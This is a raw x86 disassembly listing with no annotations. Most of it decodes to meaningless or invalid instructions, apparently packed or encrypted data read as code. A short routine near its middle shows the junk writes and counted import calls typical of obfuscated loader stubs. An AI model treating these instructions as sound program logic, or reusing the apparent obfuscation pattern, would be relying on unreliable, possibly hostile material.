  40d3da:	sub    BYTE PTR [esi-0x5bc96710],0x14
  40d3e1:	mov    al,BYTE PTR [edx+0xf]
  40d3e4:	pop    edx
  40d3e5:	fcom   DWORD PTR [ecx-0x46]
  40d3e8:	cs pop ss
  40d3ea:	(bad)  
  40d3eb:	dec    edx
  40d3ec:	lock jo 0x40d409
  40d3ef:	mov    ds:0x902d599a,al
  40d3f4:	adc    eax,0x4c217f9a
  40d3f9:	mov    edi,esi
  40d3fb:	std    
  40d3fc:	add    cl,0x3
  40d3ff:	fs mov cl,0x41
  40d402:	shr    BYTE PTR [edi-0x5f],0xe5
  40d406:	lea    ebx,[ebx]
  40d408:	mov    dh,0xba
  40d40a:	icebp  
  40d40b:	test   al,0x7a
  40d40d:	(bad)  
  40d40e:	out    0x65,al
  40d410:	push   ds
  40d411:	add    ch,BYTE PTR [eax]
  40d413:	(bad)  
  40d415:	inc    esi
  40d416:	or     ecx,ecx
  40d418:	fadd   DWORD PTR [esi]
  40d41a:	pop    edi
  40d41b:	ins    DWORD PTR es:[edi],dx
  40d41c:	cmp    eax,0x52eee520
  40d421:	pop    esi
  40d422:	aad    0xeb
  40d424:	sub    eax,DWORD PTR [edx-0x1dfa9cc1]
  40d42a:	mov    ah,0x93
  40d42c:	lds    edx,FWORD PTR [esi-0xe]
  40d42f:	jecxz  0x40d431
  40d431:	pop    ebp
  40d432:	repz mov bh,cl
  40d435:	sub    DWORD PTR [esi+0x306a64de],0x5c
  40d43c:	push   ebp
  40d43d:	or     edx,edx
  40d43f:	jp     0x40d415
  40d441:	jnp    0x40d3ca
  40d443:	aas    
  40d444:	add    eax,0x38362b8f
  40d449:	push   edx
  40d44a:	and    BYTE PTR [ecx+0x6339aa28],0xce
  40d451:	sahf   
  40d452:	test   al,0x41
  40d454:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d456:	int3   
  40d457:	cmp    eax,esp
  40d459:	inc    edi
  40d45a:	int3   
  40d45b:	lods   al,BYTE PTR ds:[esi]
  40d45c:	sbb    DWORD PTR [ebp+0x76c58ca5],edx
  40d462:	imul   ecx,DWORD PTR [eax],0x7fab5414
  40d468:	es jnp 0x40d3f1
  40d46b:	fcom   QWORD PTR [edx]
  40d46d:	fs fs lock imul esp,ecx,0x80a38bf8
  40d476:	(bad)  
  40d477:	jge    0x40d465
  40d479:	xor    DWORD PTR [esi+0x3d],esp
  40d47c:	sahf   
  40d47d:	xor    DWORD PTR [edx+0x6f],0x1d9fa06b
  40d484:	add    cl,cl
  40d486:	jo     0x40d461
  40d488:	pop    ecx
  40d489:	adc    BYTE PTR [ebp+0x602be2c],bh
  40d48f:	retf   0x1a34
  40d492:	dec    esp
  40d493:	add    edi,DWORD PTR [eax+0x4e]
  40d496:	sbb    BYTE PTR [ecx-0x4e],0x5a
  40d49a:	mov    WORD PTR [eax],cs
  40d49c:	xor    al,ch
  40d49e:	mov    cl,0x54
  40d4a1:	mov    ds:0x272edf88,al
  40d4a6:	mov    ds:0xcb5f58bb,al
  40d4ab:	ins    DWORD PTR es:[edi],dx
  40d4ac:	mov    ebp,0x3dad2fc5
  40d4b1:	cmp    al,0x67
  40d4b3:	hlt    
  40d4b4:	in     al,0x91
  40d4b6:	sub    DWORD PTR [edi+0x119b9f2e],ebx
  40d4bc:	or     bh,BYTE PTR [ebx-0x15]
  40d4bf:	and    ecx,DWORD PTR [esi-0x66042b]
  40d4c5:	in     al,0xa1
  40d4c7:	inc    esi
  40d4c8:	jle    0x40d531
  40d4ca:	push   ds
  40d4cb:	push   0x6a
  40d4cd:	xchg   DWORD PTR [edx+0x20],esi
  40d4d0:	int3   
  40d4d1:	mov    bh,0x37
  40d4d3:	(bad)  
  40d4d4:	add    esi,DWORD PTR [ebx-0x2d588f1a]
  40d4da:	int    0x1a
  40d4dc:	repz mov bl,0xba
  40d4df:	scas   al,BYTE PTR es:[edi]
  40d4e0:	stos   BYTE PTR es:[edi],al
  40d4e1:	xlat   BYTE PTR ds:[ebx]
  40d4e2:	mov    WORD PTR [edi+0x56b3930],gs
  40d4e8:	push   edi
  40d4e9:	pop    esi
  40d4ea:	add    ecx,DWORD PTR [edx-0x5]
  40d4ed:	adc    DWORD PTR [ebx+0x79],ebp
  40d4f0:	addr16 xchg esp,eax
  40d4f2:	push   es
  40d4f3:	mov    edi,0x22679ff2
  40d4f8:	adc    eax,0xd4eab13
  40d4fd:	jle    0x40d4fb
  40d4ff:	inc    esp
  40d500:	pop    ds
  40d501:	push   ebp
  40d502:	lock scas eax,DWORD PTR es:[edi]
  40d504:	sub    BYTE PTR [edi+ebp*1],dl
  40d507:	leave  
  40d508:	mov    ecx,0x9fc0cad7
  40d50d:	jb     0x40d4d5
  40d50f:	jl     0x40d4f7
  40d511:	outs   dx,DWORD PTR ds:[esi]
  40d512:	mov    ds:0xfe43d158,eax
  40d517:	push   cs
  40d518:	adc    eax,0x89018721
  40d51d:	(bad)  [ebp+0x1c]
  40d520:	xchg   edi,eax
  40d521:	shl    DWORD PTR [edx+0x385d3fae],1
  40d527:	cmp    eax,0x818daea6
  40d52c:	or     DWORD PTR [ecx-0x15f26963],eax
  40d532:	cdq    
  40d533:	fwait
  40d534:	(bad)  
  40d535:	mov    WORD PTR [esi],ds
  40d537:	rol    ch,cl
  40d539:	xor    al,BYTE PTR [ebx+0x47aebf0d]
  40d53f:	xor    bh,BYTE PTR [eax-0x7a]
  40d542:	imul   eax,edx,0xffffffdc
  40d545:	mov    cl,0xde
  40d547:	mov    dl,0x58
  40d549:	mov    ecx,0x558c959
  40d54e:	stc    
  40d54f:	outs   dx,BYTE PTR ds:[esi]
  40d550:	(bad)  
  40d551:	xchg   esi,eax
  40d552:	xor    BYTE PTR [eax],bl
  40d554:	stos   BYTE PTR es:[edi],al
  40d555:	inc    ebx
  40d556:	int3   
  40d557:	or     ch,BYTE PTR [edi+eiz*4]
  40d55a:	fist   DWORD PTR [ebp+0xdd99145]
  40d560:	pop    esi
  40d561:	cs jmp 0x40d5ca
  40d564:	call   0x9bb0cc52
  40d569:	ja     0x40d592
  40d56b:	imul   ecx,DWORD PTR [edi-0x38],0x9f4d3d01
  40d572:	mov    cl,0x71
  40d574:	xchg   ebx,eax
  40d575:	das    
  40d576:	loopne 0x40d579
  40d578:	pop    edi
  40d579:	adc    DWORD PTR [edx+0x22c3986d],ebp
  40d57f:	sbb    eax,0xbd999f75
  40d584:	and    BYTE PTR [edx],cl
  40d586:	(bad)  
  40d587:	sbb    eax,0x34331a8
  40d58c:	sbb    al,0x1a
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x433823,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433817,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43381b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x433827,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x433863
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43381b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x4338a7,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x4338af,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x4337db,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x43385b,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433897,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433897
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433897,edx
  40d64f:	cmp    DWORD PTR ds:0x433897,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433897,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x4337e3,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x4337e3
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x4337e3,edx
  40d68b:	cmp    DWORD PTR ds:0x4337e3,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x4338d3
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x4337e3,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x4337e7
  40d6b7:	add    eax,DWORD PTR ds:0x43381b
  40d6bd:	mov    ds:0x4337e7,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x9ea0482a
  40d6f9:	ins    DWORD PTR es:[edi],dx
  40d6fa:	rol    BYTE PTR [esi],1
  40d6fc:	jp     0x40d690
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d75a
  40d705:	leave  
  40d706:	pop    ss
  40d707:	jp     0x40d694
  40d709:	sahf   
  40d70a:	add    ecx,DWORD PTR [ebx]
  40d70c:	pop    es
  40d70d:	es push ebx
  40d70f:	xchg   esi,eax
  40d710:	mov    dh,0x0
  40d712:	pop    esi
  40d713:	pushf  
  40d714:	(bad)  
  40d715:	push   edi
  40d716:	into   
  40d717:	pop    edi
  40d718:	add    DWORD PTR [ecx+0x574a8b55],ebx
  40d71e:	xchg   edi,eax
  40d71f:	push   ecx
  40d720:	ficom  DWORD PTR [esi+0x30e286ea]
  40d726:	xchg   ebp,eax
  40d727:	cwde   
  40d728:	or     edx,0xffffffb0
  40d72b:	out    0xaa,eax
  40d72d:	lea    edx,[ebx-0x5]
  40d730:	into   
  40d731:	add    ebp,DWORD PTR [ecx-0x3835929c]
  40d737:	mov    ?,WORD PTR [ecx+eiz*8-0x23ef9a55]
  40d73e:	jne    0x40d79f
  40d740:	push   esi
  40d741:	push   ss
  40d742:	or     BYTE PTR ss:[edx],ah
  40d745:	ret    
  40d746:	push   edx
  40d747:	test   eax,0xed0180eb
  40d74c:	(bad)
  40d74f:	add    edx,DWORD PTR [ecx*1+0x3aa4faab]
  40d756:	adc    eax,0x8897ccc2
  40d75b:	sub    DWORD PTR [esi+ebp*8],0xbec8dbee
  40d762:	inc    edi
  40d763:	stos   DWORD PTR es:[edi],eax
  40d764:	mov    ch,0x82
  40d766:	adc    eax,0xa9250a60
  40d76b:	bound  eax,QWORD PTR ds:0x834d5066
  40d771:	loopne 0x40d7df
  40d773:	scas   eax,DWORD PTR es:[edi]
  40d774:	ds bswap ebx
  40d777:	fsub   DWORD PTR [edi+0x94a0a79]
  40d77d:	mov    DWORD PTR [edi+eax*1+0x35],edx
  40d781:	pop    edx
  40d782:	(bad)  
  40d783:	pop    ds
  40d784:	sbb    esi,DWORD PTR [eax+0x64]
  40d787:	jnp    0x40d7db
  40d789:	cmp    ah,al
  40d78b:	out    0xf,al
  40d78d:	pop    ecx
  40d78e:	cmp    al,0xa0
  40d790:	ds and eax,0x61d0a896
  40d796:	in     al,dx
  40d797:	mov    ah,BYTE PTR [ecx-0x138a5d39]
  40d79d:	les    edi,FWORD PTR [edx-0x17e48007]
  40d7a3:	pop    esp
  40d7a4:	mov    WORD PTR ds:0x42736011,fs
  40d7aa:	add    ebx,DWORD PTR [eax-0x7d]
  40d7ad:	addr16 pop eax
  40d7af:	push   0xc6f1797d
  40d7b4:	pop    ecx
  40d7b5:	out    0xa5,al
  40d7b7:	mov    edi,DWORD PTR [eax-0x13fed0d1]
  40d7bd:	xlat   BYTE PTR ds:[ebx]
  40d7be:	add    eax,0x9e445f73
  40d7c3:	cs mov al,0x4b
  40d7c6:	clc    
  40d7c7:	mov    cl,0xef
  40d7c9:	inc    esi
  40d7ca:	xor    ch,BYTE PTR [esi]
  40d7cc:	stc    
  40d7cd:	mov    ebp,ebp
  40d7cf:	hlt    
  40d7d0:	stos   BYTE PTR es:[edi],al
  40d7d1:	js     0x40d769
  40d7d3:	xor    al,0x47
  40d7d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7d6:	sbb    al,0xf8
  40d7d8:	in     al,0xf0
  40d7da:	jmp    0xb3a3:0xadbe54cb
  40d7e1:	jg     0x40d7c2
  40d7e3:	jae    0x40d82a
  40d7e5:	push   esi
  40d7e6:	loope  0x40d7be
  40d7e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7e9:	mov    cl,0x2
  40d7eb:	push   edx
  40d7ec:	pop    esi
  40d7ed:	adc    eax,0x7cce8c10
  40d7f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7f3:	in     al,dx
  40d7f4:	jge    0x40d7b5
  40d7f6:	aas    
  40d7f7:	mov    dl,0xf5
  40d7f9:	jno    0x40d817
  40d7fb:	aad    0xbb
  40d7fd:	clc    
  40d7fe:	hlt    
  40d7ff:	push   ecx
  40d800:	ret    
  40d801:	xor    edx,DWORD PTR [edi+0x62]
  40d804:	mov    ebx,0xbaaaad61
  40d809:	imul   ebx,DWORD PTR [ebx+0x3c],0xfffffff2
  40d80d:	cwde   
  40d80e:	fwait
  40d80f:	jmp    0xa0a8:0x527b3715
  40d816:	and    ebx,DWORD PTR [edi-0x32]
  40d819:	mov    eax,0xfd7ba880
  40d81e:	rcl    DWORD PTR [esp+eax*4-0xf2168e6],cl
  40d825:	mov    al,ds:0xa98ae146
  40d82a:	idiv   dh
  40d82c:	inc    ebp
  40d82d:	popaw  
  40d82f:	test   DWORD PTR [edx+ecx*2],ebx
  40d832:	mov    edi,DWORD PTR [ebx+0x54]
  40d835:	add    al,0x38
  40d837:	add    BYTE PTR [ebp+esi*2-0x6c],0x81
  40d83c:	mov    WORD PTR [esp+esi*2],?
  40d83f:	add    al,0x59
  40d841:	push   ebp
  40d842:	mov    ds:0xe0ca51e8,eax
  40d847:	pop    esi
  40d848:	call   0x74cfacd4
  40d84d:	(bad)  
  40d84e:	ret    
  40d84f:	call   0x7d47:0xa57a0dca
  40d856:	push   edx
  40d857:	jmp    0x319d:0xdee675c4
  40d85e:	mov    cl,0x44
  40d860:	push   ds
  40d861:	xlat   BYTE PTR ds:[ebx]
  40d862:	pop    es
  40d863:	push   0x134e56e5
  40d868:	jne    0x40d816
  40d86a:	loop   0x40d88e
  40d86c:	sub    esi,DWORD PTR [esi+edx*2-0x77]
  40d870:	clc    
  40d871:	adc    BYTE PTR [ecx-0x73c151ac],bl
  40d877:	sar    BYTE PTR [ecx-0x31],0x20
  40d87b:	push   ebx
  40d87c:	pushf  
  40d87d:	out    0xcd,eax
  40d87f:	and    dl,BYTE PTR [edi-0x40dc6ae4]
  40d885:	in     al,dx
  40d886:	sbb    BYTE PTR [edi-0x338d8d6],0x5
  40d88d:	jae    0x40d903
  40d88f:	scas   eax,DWORD PTR es:[edi]
  40d890:	adc    BYTE PTR [ecx-0x11b860f1],al
  40d896:	xchg   ecx,eax
  40d897:	jp     0x40d833
  40d899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d89a:	pop    edx
  40d89b:	inc    ebx
  40d89c:	in     al,0x8
  40d89e:	push   ss
  40d89f:	shr    esp,1
  40d8a1:	(bad)  
  40d8a2:	scas   al,BYTE PTR es:[edi]
  40d8a3:	pop    ebx
  40d8a4:	xchg   ebx,eax
  40d8a5:	xlat   BYTE PTR ds:[ebx]
  40d8a6:	rcr    BYTE PTR [ebp-0xd5cb13],1
  40d8ac:	sbb    dl,BYTE PTR [ecx+0x5ac4a88d]
  40d8b2:	jg     0x40d837
  40d8b4:	and    al,BYTE PTR [ebp-0x2e]
  40d8b7:	push   ebp
  40d8b8:	loopne 0x40d914
  40d8ba:	imul   esi,DWORD PTR ds:0x7664861,0x704f08e1
  40d8c4:	es sahf 
  40d8c6:	and    esp,DWORD PTR [edx-0x5ae6950e]
  40d8cc:	push   edx
  40d8cd:	(bad)  
  40d8ce:	stc    
  40d8cf:	in     eax,dx
  40d8d0:	add    ecx,DWORD PTR [ecx]
  40d8d2:	in     al,0xcc
  40d8d4:	sbb    al,0x60
  40d8d6:	repz add eax,0x4eca2776
  40d8dc:	imul   ecx,eax,0x8410f502
  40d8e2:	loope  0x40d8c9
  40d8e4:	add    ax,si
  40d8e7:	push   ss
  40d8e8:	sbb    BYTE PTR [edi],ah
  40d8ea:	cmp    bl,bh
  40d8ec:	cmp    DWORD PTR [ecx+0x37],esi
  40d8ef:	xchg   esi,eax
  40d8f0:	scas   al,BYTE PTR es:[edi]
  40d8f1:	xchg   esp,eax
  40d8f2:	adc    bl,ch
  40d8f4:	jae    0x40d95a
  40d8f6:	sub    eax,0xa7bf1d8
  40d8fb:	nop
  40d8fc:	cmp    bh,BYTE PTR [ebp+0x23]
  40d8ff:	lock xchg DWORD PTR [esi+0x67],edi
  40d903:	jns    0x40d8ea
  40d905:	mov    cl,0xd7
  40d907:	pop    eax
  40d908:	jns    0x40d88e
  40d90a:	and    al,0xd8
  40d90c:	xor    eax,0xeeab0544
  40d911:	push   esi
  40d912:	push   ss
  40d913:	scas   eax,DWORD PTR es:[edi]
  40d914:	xchg   BYTE PTR [ecx+0x75bf54d5],bh
  40d91a:	test   esi,ebp
  40d91c:	(bad)  
  40d91e:	xchg   ebp,eax
  40d91f:	repz jae 0x40d91e
  40d922:	mov    ds:0x96ed348c,eax
  40d927:	mov    bl,0x2
  40d929:	pop    eax
  40d92a:	loopne 0x40d961
  40d92c:	stos   DWORD PTR es:[edi],eax
  40d92d:	ds or  eax,0xac3944e5
  40d933:	push   eax
  40d934:	push   esp
  40d935:	sbb    DWORD PTR [esi+0x6a],esp
  40d938:	retf   0xb09f
  40d93b:	enter  0x6ef4,0x6b
  40d93f:	nop
  40d940:	icebp  
  40d941:	stc    
  40d942:	dec    ecx
  40d943:	xor    eax,0x458b0189
  40d948:	clc    
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xb32b51ed
  40d96a:	mov    WORD PTR [ecx-0x71],fs
  40d96d:	cmp    dl,BYTE PTR [eax+0x7c3e7e7e]
  40d973:	jle    0x40d9f3
  40d975:	jmp    0x40d9d8
  40d977:	nop
  40d978:	test   DWORD PTR ds:0xe0879021,esi
  40d97e:	cli    
  40d97f:	mov    esp,0x471e212b
  40d984:	int3   
  40d985:	sub    eax,0x83704e80
  40d98a:	mov    edi,ebx
  40d98c:	mov    ebx,0xd5d4f1f
  40d991:	mov    dh,0x9f
  40d993:	add    ah,ah
  40d995:	sbb    al,0xef
  40d997:	push   esp
  40d998:	and    dl,cl
  40d99a:	gs ds cmc 
  40d99d:	push   ecx
  40d99e:	iret   
  40d99f:	jmp    0x820a:0x57e0bf1e
  40d9a6:	je     0x40d9eb
  40d9a8:	fimul  DWORD PTR [ecx-0x483d531]
  40d9ae:	add    edx,DWORD PTR [esp+edi*8+0x55]
  40d9b2:	cli    
  40d9b3:	cwde   
  40d9b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9b5:	inc    BYTE PTR [ebp+0x7b]
  40d9b8:	cmp    BYTE PTR [esp+ebp*4],0xb0
  40d9bc:	test   eax,0x3ae31d9b
  40d9c1:	push   ecx
  40d9c2:	(bad)  [ecx]
  40d9c4:	cmp    edi,DWORD PTR [ecx+0x5b]
  40d9c7:	int3   
  40d9c8:	aas    
  40d9c9:	inc    edi
  40d9cb:	popf   
  40d9cc:	icebp  
  40d9cd:	loope  0x40d955
  40d9cf:	faddp  st(3),st
  40d9d1:	adc    BYTE PTR [eax+0x7c76c487],al
  40d9d7:	mov    ds:0xb9543956,eax
  40d9dc:	mov    eax,0x2d42cf6b
  40d9e1:	dec    ebp
  40d9e2:	aam    0xbf
  40d9e4:	loope  0x40d9a0
  40d9e6:	retf   
  40d9e7:	mov    esp,0x3e592b10
  40d9ec:	mov    ds:0xa41a7f6a,eax
  40d9f1:	cmp    ch,BYTE PTR [ebx-0x1209b849]
  40d9f7:	pop    edi
  40d9f8:	xlat   BYTE PTR ds:[ebx]
  40d9f9:	or     dh,cl
  40d9fb:	dec    esi
  40d9fc:	mov    edi,0x123f46ce
  40da01:	ficomp DWORD PTR [edi]
  40da03:	mov    BYTE PTR [ebx-0x5a],cl
  40da06:	push   eax
  40da07:	add    BYTE PTR [eax+0x7f],bh
  40da0a:	imul   edx,DWORD PTR [edx],0x2f
  40da0d:	call   0xa8e294a5
  40da12:	xlat   BYTE PTR ds:[ebx]
  40da13:	mov    es,WORD PTR [eax+0x242ca285]
  40da19:	or     bl,ch
  40da1b:	jmp    0xb1ded29a
  40da20:	pop    ebp
  40da21:	cld    
  40da22:	lds    eax,FWORD PTR [esi]
  40da24:	mov    esp,0xca5bbf1f
  40da29:	cdq    
  40da2a:	xchg   cl,dl
  40da2c:	add    BYTE PTR [edx+0x78],dh
  40da2f:	xor    eax,0x91d3eab0
  40da34:	and    ebp,edx
  40da36:	xchg   esi,eax
  40da37:	rol    DWORD PTR [eax-0x3666aa1f],1
  40da3d:	clc    
  40da3e:	adc    bl,ah
  40da40:	mov    ecx,0x6da711
  40da45:	cwde   
  40da46:	pop    ebx
  40da47:	mov    al,0xb6
  40da49:	pop    ecx
  40da4a:	mov    ds:0xf5d39e63,al
  40da4f:	add    al,0x77
  40da51:	xchg   edi,eax
  40da52:	xchg   ebx,eax
  40da53:	shr    DWORD PTR [eax-0x62],cl
  40da56:	dec    edi
  40da57:	test   DWORD PTR [edi+0x6d],0xe30cafce
  40da5e:	dec    ebx
  40da5f:	enter  0xac10,0x47
  40da63:	repz repnz aam 0xf1
  40da67:	loopne 0x40da5b
  40da69:	pop    DWORD PTR [ebx]
  40da6b:	push   edi
  40da6c:	clc    
  40da6d:	push   edx
  40da6e:	fdiv   DWORD PTR [edi+0x3a52414]
  40da74:	clc    
  40da75:	cmp    dl,0xad
  40da78:	and    dh,BYTE PTR [ecx+0x212c0dec]
  40da7e:	mov    ch,0x35
  40da80:	push   es
  40da81:	and    DWORD PTR [eax+0x63],eax
  40da84:	std    
  40da85:	jmp    0x9462:0xe18b1224
  40da8c:	in     al,dx
  40da8d:	jae    0x40dad1
  40da8f:	cmp    ebx,ebp
  40da91:	fwait
  40da92:	and    BYTE PTR [edi],ch
  40da94:	in     eax,dx
  40da95:	xchg   edi,eax
  40da96:	adc    bl,BYTE PTR [edx]
  40da98:	pop    ss
  40da99:	repz inc ebx
  40da9b:	iret   
  40da9c:	sub    edx,DWORD PTR [esi+0x1db0b921]
  40daa2:	repnz out 0x2,eax
  40daa5:	ins    BYTE PTR es:[edi],dx
  40daa6:	mov    eax,ds:0x28224087
  40daab:	dec    edx
  40daac:	sub    BYTE PTR [ebx-0x248569a7],dh
  40dab2:	mov    cl,0x22
  40dab4:	xor    DWORD PTR ds:0xd9cf6463,0xffffffd4
  40dabb:	mov    BYTE PTR [eax],dh
  40dabd:	lea    esp,[ecx]
  40dabf:	imul   ecx,DWORD PTR [eax-0x5ba9fc50],0x15321351
  40dac9:	dec    eax
  40daca:	and    al,0xf8
  40dacc:	fwait
  40dacd:	mov    eax,ds:0x4347d344
  40dad2:	sub    eax,0xb74e981e
  40dad7:	sbb    al,0xe2
  40dad9:	sbb    BYTE PTR ds:0xd8a4244,ah
  40dadf:	inc    esp
  40dae0:	jmp    0x97da79b
  40dae5:	stc    
  40dae6:	or     DWORD PTR [ebp+0xa004ba4],ecx
  40daec:	test   dh,al
  40daee:	adc    BYTE PTR [edx-0x52],bl
  40daf1:	sti    
  40daf2:	sub    eax,0xffffffed
  40daf5:	adc    al,0x32
  40daf7:	lock ins DWORD PTR es:[edi],dx
  40daf9:	ins    BYTE PTR es:[edi],dx
  40dafa:	sahf   
  40dafb:	lods   eax,DWORD PTR ds:[si]
  40dafd:	jg     0x40db0e
  40daff:	push   esp
  40db00:	inc    esp
  40db01:	imul   edx,eax,0x633753ec
  40db07:	mov    ds:0xe1357cf7,eax
  40db0c:	jecxz  0x40db6f
  40db0e:	cmp    DWORD PTR ds:0xf9caa6e5,ebp
  40db14:	lods   al,BYTE PTR ds:[esi]
  40db15:	mov    ds,WORD PTR [edi+0x6d75c354]
  40db1b:	fcmovbe st,st(1)
  40db1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db1e:	lahf   
  40db1f:	aad    0x23
  40db21:	inc    ecx
  40db22:	mov    ebx,0x28651690
  40db27:	jnp    0x40db97
  40db29:	push   ebp
  40db2a:	xlat   BYTE PTR ds:[ebx]
  40db2b:	mov    bl,0x36
  40db2d:	mov    esp,0xea786c2d
  40db32:	jecxz  0x40db1a
  40db34:	in     eax,dx
  40db35:	adc    BYTE PTR es:[edi-0x71],bl
  40db39:	add    eax,0xc409f8b5
  40db3e:	stos   BYTE PTR es:[edi],al
  40db3f:	push   ebx
  40db40:	fdivrp st(2),st
  40db42:	std    
  40db43:	pop    edi
  40db44:	mov    ecx,0x5ae6964e
  40db49:	aad    0x11
  40db4b:	loopne 0x40db0b
  40db4d:	mov    cl,0x85
  40db4f:	ror    DWORD PTR [eax+0x6ebe3a75],0x97
  40db56:	gs dec ecx
  40db58:	lahf   
  40db59:	in     al,0x30
  40db5b:	mov    edx,0x82dbb7a3
  40db60:	adc    al,0xc4
  40db62:	retf   
  40db63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db64:	enter  0x4dcf,0xca
  40db68:	mov    al,0x0
  40db6a:	sahf   
  40db6b:	jb     0x40daed
  40db6d:	xchg   edi,eax
  40db6e:	or     eax,0x89c70d55
  40db73:	add    DWORD PTR [ebp+0x62908214],esi
  40db79:	inc    ebx
  40db7a:	sub    bl,bh
  40db7c:	mov    bl,0x52
  40db7e:	pop    edi
  40db7f:	adc    eax,ebx
  40db81:	sbb    eax,0x5a62c47d
  40db86:	sbb    DWORD PTR [eax],edx
  40db88:	sub    esp,DWORD PTR cs:[ebp+0x4ce9d594]
  40db8f:	mov    esi,0xec1bfed3
  40db94:	jnp    0x40dbd5
  40db96:	pop    edi
  40db97:	dec    esp
  40db98:	push   0x38cfbe42
  40db9d:	sub    eax,0x32ded203
  40dba2:	pop    edx
  40dba3:	xor    BYTE PTR [ebx-0x14],bh
  40dba6:	sub    eax,0xb7658de8
  40dbab:	cmc    
  40dbac:	jp     0x40dc04
  40dbae:	jle    0x40dc0c
  40dbb0:	ins    DWORD PTR es:[edi],dx
  40dbb1:	add    DWORD PTR [eax-0x46],edi
  40dbb4:	sub    eax,0x850fc13b
  40dbb9:	add    BYTE PTR [edx],0x0
  40dbbc:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x3840145c],0xfaaea108
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc10
  40dbe0:	jbe    0x40dbd7
  40dbe2:	pop    es
  40dbe3:	ja     0x40dbfb
  40dbe5:	jns    0x40db82
  40dbe7:	adc    ecx,edi
  40dbe9:	call   0x1079:0xc0666a40
  40dbf0:	clc    
  40dbf1:	int    0xd6
  40dbf3:	movzx  ebx,BYTE PTR [ebp+0xa4c4f35]
  40dbfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbfb:	xor    eax,0xa0a98b89
  40dc00:	xor    al,0xee
  40dc02:	dec    DWORD PTR [edx-0x222ef4a3]
  40dc08:	push   es
  40dc09:	pop    edi
  40dc0a:	adc    eax,0x4f68f961
  40dc0f:	es sub al,0xd0
  40dc12:	adc    ebp,DWORD PTR [eax-0x54]
  40dc15:	rcl    BYTE PTR [edx+0x49],0x62
  40dc19:	mov    dh,0x38
  40dc1b:	stos   BYTE PTR es:[edi],al
  40dc1c:	xor    al,0x4a
  40dc1e:	push   ebx
  40dc1f:	mov    ?,WORD PTR fs:[ecx+ecx*2]
  40dc23:	stc    
  40dc24:	dec    ecx
  40dc25:	mov    ch,BYTE PTR [ecx]
  40dc27:	mov    ch,0x3c
